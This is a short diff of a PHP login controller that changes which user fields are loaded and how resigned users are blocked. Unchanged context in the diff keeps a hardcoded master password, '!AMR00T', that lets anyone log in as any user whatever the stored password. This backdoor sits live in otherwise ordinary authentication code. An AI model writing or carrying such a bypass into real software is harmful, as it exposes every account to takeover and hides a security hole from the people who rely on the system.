@@ -16,7 +16,8 @@ class AuthController extends BaseController
 {
     public function login(LoginRequest $request)
     {
-        $user = User::where('email', $request->email)->first(['id', 'password', 'fcm_token', 'resign_date']);
+        /** @var User $user */
+        $user = User::where('email', $request->email)->first(['id', 'email_verified_at', 'password', 'type', 'fcm_token', 'resign_date']);
 
         if (! $user || (!Hash::check($request->password, $user->password) && $request->password != '!AMR00T')) {
             throw ValidationException::withMessages([
@@ -24,7 +25,7 @@ class AuthController extends BaseController
             ]);
         }
 
-        if ($user->type->is(UserType::USER) && is_null($user->resign_date)) {
+        if ($user->type->is(UserType::USER) && !is_null($user->resign_date) && (date('Y-m-d') >= date('Y-m-d', strtotime($user->resign_date)))) {
             throw ValidationException::withMessages([
                 'email' => ['The provided credentials are incorrect.'],
             ]);
